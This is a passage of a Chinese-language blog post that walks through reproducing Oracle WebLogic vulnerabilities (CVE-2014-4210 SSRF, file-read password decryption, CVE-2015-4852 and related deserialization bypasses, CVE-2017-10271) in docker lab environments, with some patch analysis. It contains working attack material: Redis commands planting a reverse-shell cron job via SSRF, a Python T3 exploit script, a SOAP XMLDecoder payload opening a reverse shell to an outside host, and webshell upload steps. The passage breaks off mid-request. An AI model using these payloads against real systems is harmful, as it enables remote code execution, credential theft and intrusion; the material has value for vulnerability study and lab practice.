1998年3月</span><br><span class="line">WebLogic Tengah 3.0 - 1998年1月</span><br><span class="line">WebLogic Tengah - 1997年11月</span><br></pre></td></tr></table></figure><h1 id="SSRF-CVE-2014-4210"><a href="#SSRF-CVE-2014-4210" class="headerlink" title="SSRF(CVE-2014-4210)"></a>SSRF(CVE-2014-4210)</h1><p>漏洞描述：Oracle融合中间件10.0.2.0和10.3.6.0中Oracle WebLogic Server组件中未指定的漏洞允许远程攻击者通过与WLS-Web服务相关的向量影响机密性。</p><p>影响版本：10.0.2.0、10.3.6.0  </p><p>SSRF漏洞测试<br>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，</a>  我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:80：">http://127.0.0.1:80：</a>   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。<br><img src="../../images/java/weblogic/7.png" alt=""><br>修改为一个不存在的端口，将会返回could not connect over HTTP to server。<br><img src="../../images/java/weblogic/8.png" alt=""></p><p>通过错误的不同，即可探测内网状态  </p><p>注入HTTP头，利用Redis反弹shell<br>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是<code>172.*</code>），发现172.28.0.2:6379可以连通<br>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> 1 <span class="string">"\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1'\n\n\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/</span><br><span class="line">config <span class="built_in">set</span> dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>进行URL编码<br><img src="../../images/java/weblogic/9.png" alt=""><br>注意，换行符是“\r\n”，也就是“%0D%0A”。</p><p>将url编码后的字符串放在ssrf的域名后面，发送：<br><img src="../../images/java/weblogic/10.png" alt=""><br>成功反弹shell<br><img src="../../images/java/weblogic/11.png" alt="">  </p><h1 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h1><p>弱口令<br>环境启动后，访问<a href="http://your-ip:7001/console，即为weblogic后台。" target="_blank" rel="noopener">http://your-ip:7001/console，即为weblogic后台。</a></p><p>本环境存在弱口令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic</span><br><span class="line">Oracle@123</span><br></pre></td></tr></table></figure><p>任意文件读取漏洞的利用<br>假设不存在弱口令，如何对weblogic进行渗透？</p><p>本环境前台模拟了一个任意文件下载漏洞，访问<a href="http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？" target="_blank" rel="noopener">http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？</a>   </p><p>读取后台用户密文与密钥文件<br>weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。   </p><p>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件： </p><p><img src="../../images/java/weblogic/12.png" alt=""><br>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，不要找错了：  </p><p><img src="../../images/java/weblogic/13.png" alt="">  </p><p>解密密文<br>然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：<a href="http://cb.drops.wiki/drops/tips-349.html" target="_blank" rel="noopener">http://cb.drops.wiki/drops/tips-349.html</a> ，自己编译一个解密的工具）：<br>ps: 一开始bp的字体为宋体没解密成功，后面改为黑体解密成功了？<br><img src="../../images/java/weblogic/14.png" alt="">  </p><p>可见，解密后和我预设的密码一致，说明成功。</p><p>后台上传webshell<br>获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表：<br><img src="../../images/java/weblogic/15.png" alt=""> </p><p>点击安装，选择“上载文件”：  </p><p><img src="../../images/java/weblogic/16.png" alt=""><br>上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。</p><p>填写应用名称：<br><img src="../../images/java/weblogic/17.png" alt=""><br>继续一直下一步，最后点完成。</p><p>应用目录在war包中WEB-INF/weblogic.xml里指定（因为本测试环境已经使用了/hello这个目录，所以你要在本测试环境下部署shell，需要修改这个目录，比如修改成/jspspy）：<br><img src="../../images/java/weblogic/18.png" alt=""><br>成功获取webshell：<br><img src="../../images/java/weblogic/19.png" alt="">   </p><h1 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h1><p>漏洞描述：Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0中的WLS安全组件允许远程攻击者在与oracle_common/modules/com.bea.core.apache.commons.collections.jar.相关的T3协议流量中通过精心编制的序列化Java对象执行任意命令。注意：此CVE的范围仅限于WebLogicServer产品</p><p>影响版本：10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0</p><p>参考文章：<a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652482299&idx=1&sn=b045360e713bfc80ac6620c03047e690" target="_blank" rel="noopener">WebLogic系列漏洞学习之T3：CVE-2015-4852</a>   </p><p>漏洞环境  </p><p>Dockerfile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM vulhub&#x2F;weblogic  </span><br><span class="line">ENV debugFlag true  </span><br><span class="line">EXPOSE 7001  </span><br><span class="line">EXPOSE 8453</span><br></pre></td></tr></table></figure><p>docker-compose.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: &#39;2&#39;</span><br><span class="line">services:</span><br><span class="line"> weblogic:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;7001:7001&quot;</span><br><span class="line">      - &quot;8453:8453&quot;</span><br></pre></td></tr></table></figure><p>docker-compose up -d   </p><p>漏洞复现<br>先生成反序列化文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  CommonsCollections1 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; poc.ser</span><br></pre></td></tr></table></figure><p>T3利用脚本 exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="comment"># time.sleep(1)</span></span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.1.103'</span>,<span class="string">'7001'</span>,<span class="string">'D:\security\penetration\漏洞利用\java\weblogic\CVE-2015-4852\poc.ser'</span>)</span><br></pre></td></tr></table></figure><p>远程调试</p><p>搭建环境复现的时候我们已经对容器开去了远程调试服务，下面只需要对本地IDEA环境进行部署。</p><p>首先从容器拷贝root目录，然后单独将相关的jar包拷贝出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker cp 容器id:&#x2F;root .</span><br><span class="line">mkdir jar_lib</span><br><span class="line">find .&#x2F; -name *.jar -exec cp &#123;&#125; jar_lib&#x2F; \;</span><br></pre></td></tr></table></figure><p>将上述 jar_lib 和 root 放到本地，然后用 IDEA 打开 root/Oracle/Middleware/wlserver_10.3，File-&gt;project Structure 将jar_lib加入libraries<br><img src="../../images/java/weblogic/23.png" alt=""><br>选择weblogic自带的jdk root/jdk/jdk1.6.0_45<br><img src="../../images/java/weblogic/25.png" alt=""><br>添加远程JVM<br><img src="../../images/java/weblogic/24.png" alt=""><br>在wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev:24行打断点<br><img src="../../images/java/weblogic/26.png" alt=""></p><p>详细分析可看此文章 [WebLogic系列漏洞学习之T3：CVE-2015-4852]<br>tcpdump监听，然后运行脚本抓到了t3协议的流量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i any -w dump.pcap</span><br></pre></td></tr></table></figure><p>传输了序列化对象，知道ac ed 00 05是Java中序列化对象的特点，过滤下，并追踪tcp流<br><img src="../../images/java/weblogic/27.png" alt=""><br><img src="../../images/java/weblogic/28.png" alt=""><br>hex转储下，存在序列化数据<br><img src="../../images/java/weblogic/29.png" alt=""> </p><h1 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h1><p><img src="../../images/java/weblogic/31.png" alt=""><br>由于CVE-2015-4852的修复是基于黑名单的，所以我们如果能找到一个对象，其可以在自己的readObject中创建自己的InputStream的对象，这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readExternal</span><span class="params">(ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       <span class="keyword">super</span>.readExternal(var1);</span><br><span class="line">       <span class="keyword">byte</span> var2 = var1.readByte();</span><br><span class="line">       <span class="keyword">byte</span> var3 = (<span class="keyword">byte</span>)(var2 &amp; <span class="number">127</span>);</span><br><span class="line">       <span class="keyword">if</span> (var3 &gt;= <span class="number">1</span> &amp;&amp; var3 &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">           <span class="keyword">switch</span>(var3) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               <span class="keyword">this</span>.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);</span><br><span class="line">               BufferInputStream var4 = <span class="keyword">this</span>.payload.getInputStream();</span><br><span class="line">               ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">               <span class="keyword">this</span>.setBodyWritable(<span class="keyword">true</span>);</span><br><span class="line">               <span class="keyword">this</span>.setPropertiesWritable(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                       <span class="keyword">this</span>.writeObject(var5.readObject());</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (EOFException var9) &#123;</span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                   ……</span><br></pre></td></tr></table></figure><p><a href="https://github.com/5up3rc/weblogic_cmd" target="_blank" rel="noopener">weblogic_cmd工具</a>    </p><p>这个工具直接当做IDEA的工程打开即可，配置application参数<br><img src="../../images/java/weblogic/30.png" alt=""> </p><p>详情可看此文章：<a href="https://www.anquanke.com/post/id/224343" target="_blank" rel="noopener">https://www.anquanke.com/post/id/224343</a>  </p><h1 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h1><p>weblogic.corba.utils.MarshalledObject 绕过黑名单。这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes。MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MarshalledObject</span><span class="params">(Object var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.hash = <span class="number">13</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayOutputStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        MarshalledObject.MarshalledObjectOutputStream var3 = <span class="keyword">new</span> MarshalledObject.MarshalledObjectOutputStream(var2);</span><br><span class="line">        var3.writeObject(var1);</span><br><span class="line">        var3.flush();</span><br><span class="line">        <span class="keyword">this</span>.objBytes = var2.toByteArray();</span><br><span class="line">        <span class="keyword">int</span> var4 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> var5 = <span class="number">0</span>; var5 &lt; <span class="keyword">this</span>.objBytes.length; ++var5) &#123;</span><br><span class="line">            var4 = <span class="number">31</span> * var4 + <span class="keyword">this</span>.objBytes[var5];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.hash = var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">readResolve</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, ObjectStreamException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.objBytes == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ByteArrayInputStream var1 = <span class="keyword">new</span> ByteArrayInputStream(<span class="keyword">this</span>.objBytes);</span><br><span class="line">        ObjectInputStream var2 = <span class="keyword">new</span> ObjectInputStream(var1);</span><br><span class="line">        Object var3 = var2.readObject();</span><br><span class="line">        var2.close();</span><br><span class="line">        <span class="keyword">return</span> var3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详情可看此文章：<a href="https://xz.aliyun.com/t/8529" target="_blank" rel="noopener">https://xz.aliyun.com/t/8529</a>  </p><h1 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h1><p>CVE-2015-4852往后有一系列漏洞都是立足于对其补丁的绕过的，CVE-2017-3248也是其中之一。</p><p>WebLogic 使用这种黑名单的方式试图过滤掉危险的类的这种修复方式有一定的效果，但也存在被绕过的风险。根据学习，我了解到的绕过的思路有如下几种：一是找到可用且未在黑名单之内的新类（新类要能构造链实现任意代码执行），此时的payload为新的；二是找到一种类，这种类可以反序列化自身成员变量，此时可以封装旧的payload；三是找到未在黑名单之内的新反序列化点，此时可以发旧的payload。CVE-2016-3510和CVE-2016-0638主要是基于第二种思路， CVE-2017-3248 则是基于第三种思路，通过JRMP 协议达到执行任意反序列化 payload。      </p><p>漏洞利用可以使用下面CVE-2018-2628的exp</p><p>详情可看此文章： <a href="https://www.anquanke.com/post/id/225137" target="_blank" rel="noopener">https://www.anquanke.com/post/id/225137</a>  </p><h1 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h1><p>漏洞利用：<br>工具：<a href="https://github.com/ianxtianxt/CVE-2017-3506" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2017-3506</a>  </p><p>详情可看此文章：<a href="https://guokeya.github.io/post/TsCTC6Ohu/" target="_blank" rel="noopener">https://guokeya.github.io/post/TsCTC6Ohu/</a>   </p><p>补丁代码：<br>首先来看3506的补丁的分析，在文件 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，<br>添加了validate方法，方法的实现如下： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</span><br><span class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         SAXParser parser = factory.newSAXParser();</span><br><span class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</span><br><span class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。</p><h1 id="Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-lt-10-3-6-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><p>CVE-2017-10271与3506他们的漏洞原理是一样的,只不过10271绕过了3506的补丁,我们来看下补丁是怎么处理的。  </p><p><img src="../../images/java/weblogic/33.png" alt=""><br>图中红框内的代码是限制CVE-2017-3506漏洞利用的黑名单，这次补丁修补得非常的简陋，仅仅是根据POC中的object标签进行了修补，所以很快就出现了CVE-2017-10271漏洞。CVE-2017-10271的POC与CVE-2017-3506的POC很相似，只是将object标签换成了array或void等标签，即可触发远程代码执行漏洞。因此，在CVE-2017-10271漏洞爆发之后，Oracle官方也进行了补丁的完善，这一次的补丁考虑得比较全面，在黑名单中又添加了new,method,void,array等关键字进行漏洞修补，成功防御了CVE-2017-10271漏洞。</p><p>漏洞复现  </p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹shell：<br><img src="../../images/java/weblogic/21.png" alt="">  </p><p>写入webshell（访问：<a href="http://your-ip:7001/bea_wls_internal/test.jsp）：" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp）：</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope 